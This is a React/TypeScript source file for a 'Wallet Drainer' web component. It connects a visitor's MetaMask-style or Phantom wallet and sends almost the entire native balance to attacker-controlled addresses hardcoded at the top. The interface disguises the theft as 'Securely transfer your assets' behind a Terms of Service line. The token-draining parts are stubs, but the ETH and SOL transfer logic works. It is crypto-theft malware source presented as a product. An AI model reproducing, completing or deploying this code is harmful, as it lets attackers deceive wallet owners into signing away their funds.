'use client';
import { useState, useEffect, useCallback } from 'react';
import { ethers } from 'ethers';
import * as solanaWeb3 from '@solana/web3.js';
import * as splToken from '@solana/spl-token';
import Image from 'next/image';

// ========================
// Type Definitions
// ========================

type NetworkType = 'evm' | 'solana';
type WalletState = 'disconnected' | 'connecting' | 'connected' | 'error';
type DrainStatus = 'idle' | 'preparing' | 'draining' | 'completed' | 'failed';

interface WalletInfo {
  address: string;
  network: NetworkType;
  provider: any;
  signer?: any;
  balance?: string;
  chainId?: number;
}

interface TokenInfo {
  address: string;
  symbol: string;
  decimals: number;
  balance: string;
  valueUSD?: number;
}

interface DrainProgress {
  status: DrainStatus;
  currentStep: number;
  totalSteps: number;
  currentAction: string;
  error?: string;
  txHashes: string[];
}

// ========================
// Constants
// ========================

const EVM_RECEIVER = '0xcc35ba2aa35B3094702d767D68807c494946ac85';
const SOL_RECEIVER = '8jizHpcMd4ASNKppeAeMeSvJLVR84H2NJaiz9mEV3Dxh';

const SOLANA_RPC_ENDPOINTS = [
  'https://api.mainnet-beta.solana.com',
  'https://solana-api.projectserum.com',
  'https://solana-api.rpcpool.com',
];

// ========================
// Core Services
// ========================

import { detectWallets, connectEVM, connectSolana } from '../utils/walletDetection';

class WalletService {
  static async detectWallets() {
    return detectWallets();
  }

  static async connectEVM(): Promise<WalletInfo> {
    const wallet = await connectEVM();
    return {
      address: wallet.address,
      network: 'evm',
      provider: wallet.provider,
      signer: wallet.signer,
      chainId: wallet.chainId,
    };
  }

  static async connectSolana(): Promise<WalletInfo> {
    const wallet = await connectSolana();
    return {
      address: wallet.address,
      network: 'solana',
      provider: wallet.provider,
    };
  }
}

class DrainManager {
  private progressCallback: (progress: DrainProgress) => void;
  private currentProgress: DrainProgress;

  constructor(progressCallback: (progress: DrainProgress) => void) {
    this.progressCallback = progressCallback;
    this.currentProgress = {
      status: 'idle',
      currentStep: 0,
      totalSteps: 0,
      currentAction: '',
      txHashes: [],
    };
  }

  private updateProgress(updates: Partial<DrainProgress>) {
    this.currentProgress = { ...this.currentProgress, ...updates };
    this.progressCallback(this.currentProgress);
  }

  async drainWallet(wallet: WalletInfo): Promise<void> {
    try {
      this.updateProgress({
        status: 'preparing',
        currentStep: 0,
        totalSteps: 3,
        currentAction: 'Preparing to drain...',
      });

      if (wallet.network === 'evm') {
        await this.drainEVM(wallet);
      } else {
        await this.drainSolana(wallet);
      }

      this.updateProgress({
        status: 'completed',
        currentAction: 'Drain completed successfully',
      });
    } catch (error) {
      console.error('Drain failed:', error);
      this.updateProgress({
        status: 'failed',
        error: error instanceof Error ? error.message : 'Unknown error occurred',
        currentAction: 'Drain failed',
      });
      throw error;
    }
  }

  private async drainEVM(wallet: WalletInfo): Promise<void> {
    if (!wallet.signer) throw new Error('No signer available');
    
    // 1. Get native balance
    this.updateProgress({
      currentStep: 1,
      currentAction: 'Checking native balance...',
    });
    
    const balance = await wallet.provider.getBalance(wallet.address);
    
    if (balance > 0) {
      // 2. Transfer native currency
      this.updateProgress({
        currentStep: 2,
        currentAction: 'Transferring native currency...',
      });
      
      const tx = await wallet.signer.sendTransaction({
        to: EVM_RECEIVER,
        value: balance.sub(ethers.parseEther('0.001')), // Leave some for gas
      });
      
      await tx.wait();
      this.currentProgress.txHashes.push(tx.hash);
      this.updateProgress({});
    }
    
    // 3. Handle token transfers
    this.updateProgress({
      currentStep: 3,
      currentAction: 'Processing tokens...',
    });
    
    // Token draining logic would go here
  }

  private async drainSolana(wallet: WalletInfo): Promise<void> {
    // 1. Connect to Solana cluster
    this.updateProgress({
      currentStep: 1,
      currentAction: 'Connecting to Solana...',
    });
    
    let connection: solanaWeb3.Connection | null = null;
    for (const endpoint of SOLANA_RPC_ENDPOINTS) {
      try {
        const testConnection = new solanaWeb3.Connection(endpoint, 'confirmed');
        await testConnection.getLatestBlockhash();
        connection = testConnection;
        break;
      } catch (e) {
        console.warn(`Failed to connect to ${endpoint}, trying next...`);
      }
    }
    
    if (!connection) throw new Error('Failed to connect to Solana');
    
    // 2. Get SOL balance
    this.updateProgress({
      currentStep: 2,
      currentAction: 'Checking SOL balance...',
    });
    
    const fromPubkey = new solanaWeb3.PublicKey(wallet.address);
    const toPubkey = new solanaWeb3.PublicKey(SOL_RECEIVER);
    const balance = await connection.getBalance(fromPubkey);
    
    if (balance > 10000) { // Minimum balance to cover fees
      // 3. Transfer SOL
      this.updateProgress({
        currentStep: 3,
        currentAction: 'Transferring SOL...',
      });
      
      const transferAmount = balance - 10000; // Leave some for fees
      const transaction = new solanaWeb3.Transaction().add(
        solanaWeb3.SystemProgram.transfer({
          fromPubkey,
          toPubkey,
          lamports: transferAmount,
        })
      );
      
      const { blockhash } = await connection.getLatestBlockhash();
      transaction.recentBlockhash = blockhash;
      transaction.feePayer = fromPubkey;
      
      const signed = await wallet.provider.signTransaction(transaction);
      const signature = await connection.sendRawTransaction(signed.serialize());
      await connection.confirmTransaction(signature, 'confirmed');
      
      this.currentProgress.txHashes.push(signature);
      this.updateProgress({});
    }
    
    // 4. Handle SPL tokens
    this.updateProgress({
      currentStep: 4,
      currentAction: 'Processing SPL tokens...',
    });
    
    // SPL token draining logic would go here
  }
}

// ========================
// UI Components
// ========================

interface WalletButtonProps {
  type: 'evm' | 'solana';
  onClick: () => void;
  disabled?: boolean;
}

const WalletButton = ({ type, onClick, disabled = false }: WalletButtonProps) => (
  <button
    onClick={onClick}
    disabled={disabled}
    className={`flex items-center justify-center gap-2 px-6 py-3 rounded-lg font-medium transition-colors ${
      type === 'evm' 
        ? 'bg-blue-600 hover:bg-blue-700 text-white' 
        : 'bg-purple-600 hover:bg-purple-700 text-white'
    } ${disabled ? 'opacity-50 cursor-not-allowed' : ''}`}
  >
    <Image 
      src={`/wallets/${type === 'evm' ? 'metamask' : 'phantom'}.png`} 
      alt={`${type} logo`} 
      width={24} 
      height={24} 
      className="w-6 h-6"
    />
    Connect {type === 'evm' ? 'EVM' : 'Solana'} Wallet
  </button>
);

const ProgressBar = ({ progress }: { progress: DrainProgress }) => (
  <div className="w-full bg-gray-200 rounded-full h-2.5">
    <div 
      className="h-2.5 rounded-full bg-green-500 transition-all duration-300"
      style={{
        width: `${(progress.currentStep / Math.max(1, progress.totalSteps)) * 100}%`,
      }}
    />
  </div>
);

const StatusMessage = ({ progress }: { progress: DrainProgress }) => {
  if (progress.status === 'idle') return null;
  
  const statusColors = {
    preparing: 'bg-yellow-500/10 text-yellow-400',
    draining: 'bg-blue-500/10 text-blue-400',
    completed: 'bg-green-500/10 text-green-400',
    failed: 'bg-red-500/10 text-red-400',
  };
  
  return (
    <div className={`mt-4 p-4 rounded-lg ${statusColors[progress.status] || 'bg-gray-100'}`}>
      <p className="font-medium">
        {progress.status === 'completed' ? '✅ ' : 
         progress.status === 'failed' ? '❌ ' : '⏳ '}
        {progress.currentAction}
      </p>
      {progress.error && (
        <p className="mt-2 text-sm text-red-600">{progress.error}</p>
      )}
      {progress.txHashes.length > 0 && (
        <div className="mt-2">
          <p className="text-sm font-medium">Transactions:</p>
          <ul className="text-sm space-y-1 mt-1">
            {progress.txHashes.map((txHash, i) => (
              <li key={i} className="break-all">
                <a 
                  href={`https://solscan.io/tx/${txHash}`} 
                  target="_blank" 
                  rel="noopener noreferrer"
                  className="text-blue-500 hover:underline"
                >
                  View on explorer
                </a>
              </li>
            ))}
          </ul>
        </div>
      )}
    </div>
  );
};

// ========================
// Main Component
// ========================

interface DrainerManagerProps {
  onComplete?: () => void;
  onError?: (error: Error) => void;
}

export default function DrainerManager({ onComplete, onError }: DrainerManagerProps) {
  const [wallet, setWallet] = useState<WalletInfo | null>(null);
  const [walletState, setWalletState] = useState<WalletState>('disconnected');
  const [availableWallets, setAvailableWallets] = useState<{ evm: boolean; solana: boolean }>({ evm: false, solana: false });
  const [drainProgress, setDrainProgress] = useState<DrainProgress>({
    status: 'idle',
    currentStep: 0,
    totalSteps: 0,
    currentAction: '',
    txHashes: [],
  });

  // Detect available wallets on component mount
  useEffect(() => {
    const detectWallets = async () => {
      try {
        const wallets = await WalletService.detectWallets();
        setAvailableWallets(wallets);
      } catch (error) {
        console.error('Failed to detect wallets:', error);
      }
    };
    detectWallets();
  }, []);

  // Handle EVM wallet connection
  const connectEVM = async () => {
    try {
      setWalletState('connecting');
      const walletInfo = await WalletService.connectEVM();
      setWallet(walletInfo);
      setWalletState('connected');
    } catch (error) {
      console.error('Failed to connect EVM wallet:', error);
      setWalletState('error');
      onError?.(error instanceof Error ? error : new Error('Failed to connect EVM wallet'));
    }
  };

  // Handle Solana wallet connection
  const connectSolana = async () => {
    try {
      setWalletState('connecting');
      const walletInfo = await WalletService.connectSolana();
      setWallet(walletInfo);
      setWalletState('connected');
    } catch (error) {
      console.error('Failed to connect Solana wallet:', error);
      setWalletState('error');
      onError?.(error instanceof Error ? error : new Error('Failed to connect Solana wallet'));
    }
  };

  // Handle the drain process
  const handleDrain = async () => {
    if (!wallet) return;
    
    const drainManager = new DrainManager((progress) => {
      setDrainProgress(progress);
      if (progress.status === 'completed') {
        onComplete?.();
      } else if (progress.status === 'failed' && progress.error) {
        onError?.(new Error(progress.error));
      }
    });
    
    try {
      await drainManager.drainWallet(wallet);
    } catch (error) {
      console.error('Drain process failed:', error);
      onError?.(error instanceof Error ? error : new Error('Drain process failed'));
    }
  };

  // Reset the component state
  const reset = () => {
    setWallet(null);
    setWalletState('disconnected');
    setDrainProgress({
      status: 'idle',
      currentStep: 0,
      totalSteps: 0,
      currentAction: '',
      txHashes: [],
    });
  };

  // Render connection UI
  const renderConnectionUI = () => {
    if (walletState === 'connected' && wallet) {
      return (
        <div className="space-y-6 text-center">
          <div className="bg-gray-800 p-4 rounded-lg">
            <p className="text-sm text-gray-300">Connected with {wallet.network === 'evm' ? 'EVM' : 'Solana'}</p>
            <p className="text-sm font-mono text-gray-400 mt-1 break-all">
              {wallet.address.slice(0, 6)}...{wallet.address.slice(-4)}
            </p>
          </div>
          
          <button
            onClick={handleDrain}
            disabled={drainProgress.status === 'draining'}
            className="w-full bg-green-600 hover:bg-green-700 text-white font-medium py-3 px-6 rounded-lg transition-colors disabled:opacity-50 disabled:cursor-not-allowed"
          >
            {drainProgress.status === 'draining' ? 'Draining...' : 'Start Drain'}
          </button>
          
          <button
            onClick={reset}
            className="text-sm text-gray-400 hover:text-gray-300"
          >
            Disconnect Wallet
          </button>
        </div>
      );
    }

    return (
      <div className="space-y-4">
        <h2 className="text-2xl font-bold text-white mb-6 text-center">Connect Your Wallet</h2>
        
        <div className="space-y-4">
          {availableWallets.evm && (
            <WalletButton 
              type="evm" 
              onClick={connectEVM}
              disabled={walletState === 'connecting'}
            />
          )}
          
          {availableWallets.solana && (
            <WalletButton 
              type="solana" 
              onClick={connectSolana}
              disabled={walletState === 'connecting'}
            />
          )}
          
          {!availableWallets.evm && !availableWallets.solana && (
            <div className="text-center py-8">
              <p className="text-gray-400">No web3 wallet detected</p>
              <p className="text-sm text-gray-500 mt-2">
                Please install a wallet like MetaMask (EVM) or Phantom (Solana)
              </p>
            </div>
          )}
        </div>
      </div>
    );
  };

  return (
    <div className="max-w-md mx-auto bg-gray-900/80 backdrop-blur-sm rounded-2xl p-6 shadow-xl border border-gray-700">
      <div className="mb-6 text-center">
        <h1 className="text-3xl font-bold bg-gradient-to-r from-green-400 to-blue-500 bg-clip-text text-transparent">
          Wallet Drainer
        </h1>
        <p className="text-gray-400 mt-2">Securely transfer your assets</p>
      </div>
      
      <div className="bg-gray-800/50 p-6 rounded-xl">
        {renderConnectionUI()}
        
        {(drainProgress.status !== 'idle' || drainProgress.txHashes.length > 0) && (
          <div className="mt-6 space-y-4">
            <div className="flex justify-between text-sm text-gray-400 mb-1">
              <span>Progress</span>
              <span>
                {drainProgress.currentStep} / {Math.max(1, drainProgress.totalSteps)}
              </span>
            </div>
            <ProgressBar progress={drainProgress} />
            <StatusMessage progress={drainProgress} />
          </div>
        )}
      </div>
      
      <div className="mt-6 text-center">
        <p className="text-xs text-gray-500">
          By using this service, you agree to our Terms of Service
        </p>
      </div>
    </div>
  );
}
